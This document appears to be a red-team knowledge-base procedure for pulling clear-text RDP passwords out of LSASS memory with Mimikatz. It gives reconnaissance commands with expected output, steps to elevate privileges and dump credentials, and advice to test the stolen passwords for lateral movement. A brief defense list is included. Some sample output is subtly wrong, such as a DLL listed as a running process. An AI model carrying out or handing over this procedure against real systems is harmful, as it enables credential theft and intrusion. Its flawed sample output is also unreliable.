---
id: 0efb1e98-1ba8-4e00-aebe-4e6f6130986d
name: Mimikatz-RDP-Password-Extraction
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.429767+00:00'
updated_at: '2023-04-10T20:37:15.514270+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/RDP Passwords]]'
  - '[[tags/Windows - Mimikatz]]'
commands:
  - '[[commands/sc-queryex-termservice]]'
  - '[[commands/tasklist-module-rdpcorets]]'
  - '[[commands/netstat-nob-termservice]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Mimikatz-RDP-Password-Extraction

## Summary

This procedure uses Mimikatz to extract clear-text Remote Desktop Protocol (RDP) passwords from the LSASS process memory on Windows systems. It begins with verifying the RDP service status and proceeds to dumping credentials, enabling attackers to reuse them for lateral movement or remote access.

## Description

Mimikatz RDP Password Extraction targets credentials stored in memory during active RDP sessions. When a user connects via RDP, Windows stores authentication details in the Local Security Authority Subsystem Service (LSASS). Mimikatz, with debug privileges, can read this memory to retrieve usernames, domains, and plaintext passwords. This technique requires administrative access and is commonly used in post-exploitation phases after initial compromise. It applies to Windows Server and desktop editions with RDP enabled (typically port 3389). Success depends on recent RDP logins, as credentials may not persist indefinitely.

## Requirements

1. Administrative privileges on the target Windows system (local or remote shell access)
2. Mimikatz executable (pre-compiled binary or source built on target)
3. RDP service enabled with active or recent sessions
4. PowerShell or Command Prompt access for service checks
5. No advanced protections like Credential Guard enabled

## Defense

Defensive measures and detection strategies:

- Disable RDP exposure to the internet and use network-level controls (e.g., firewalls restricting port 3389)
- Enforce strong password policies, account lockouts, and MFA for RDP logins
- Enable Windows Defender Credential Guard to isolate LSASS and prevent memory scraping
- Deploy EDR solutions to monitor for Mimikatz execution, debug privilege elevation, and anomalous LSASS access
- Regularly audit RDP logs for unusual login patterns and failed authentications

## Objectives

1. Confirm RDP service is operational and potentially holding credentials
2. Elevate privileges and dump RDP-specific credentials from memory
3. Obtain reusable plaintext passwords for further network access or persistence

## Instructions

### Step 1: Verify RDP Service Status

**Context**: Ensure the Remote Desktop Services (TermService) are running, modules are loaded, and the service is listening on the network. This step confirms the target environment supports RDP credential extraction; if not active, no credentials may be available.

**Command** ([[commands/sc-queryex-termservice]]):
```powershell
sc queryex termservice
```
> Queries the extended state of the TermService. This is performed first to check if the core RDP service is running.

**Expected Output**: 
```
SERVICE_NAME: TermService
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
        ...
```

**Command** ([[commands/tasklist-module-rdpcorets]]):
```powershell
tasklist /M:rdpcorets.dll
```
> Lists processes using the rdpcorets.dll module, which handles RDP core functionality. This verifies if RDP components are loaded in memory.

**Expected Output**:
```
Image Name                     PID Modules
========================= ======== ================================ 
rdpclip.exe                   1234 rdpcorets.dll
termsrv.dll                   5678 rdpcorets.dll
```

**Command** ([[commands/netstat-nob-termservice]]):
```powershell
netstat -nob | Select-String TermService -Context 1
```
> Filters active connections to identify TermService listening, typically on TCP 3389. This confirms network exposure for RDP.

**Expected Output**:
```
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
 [svchost.exe]

TermService:
  Can not identify the owner of the process.
```

### Step 2: Extract RDP Credentials Using Mimikatz

**Context**: Launch Mimikatz with administrative rights to access protected memory. Elevate to debug privileges, then target the RDP credential store in LSASS. This step accomplishes the core objective of retrieving plaintext passwords from active RDP sessions.

**Tool** ([[tools/Mimikatz]]):

Execute `mimikatz.exe` from an elevated Command Prompt or PowerShell.

**Code** ([[codes/Mimikatz-RDP-Credential-Extraction-Session]]):

Within the Mimikatz interactive prompt, run the provided session code to elevate and dump.

**Expected Output**:
```
Privilege '20' OK
RDP Creds :

  Username : john.doe
  Domain   : WORKSTATION
  Password : P@ssw0rd123

ERROR kuhl_m_sekurlsa_acquireLSA ; LSA access denied (no interactive logon session)
```
> Successful dumps show usernames, domains, and passwords for RDP sessions. Errors may occur if no sessions exist or protections are in place.

## Expected Output

Overall success is indicated by active RDP service confirmation and Mimikatz outputting at least one valid RDP credential set (username/password pair). Use these for tools like `xfreerdp` or `rdesktop` to test validity.
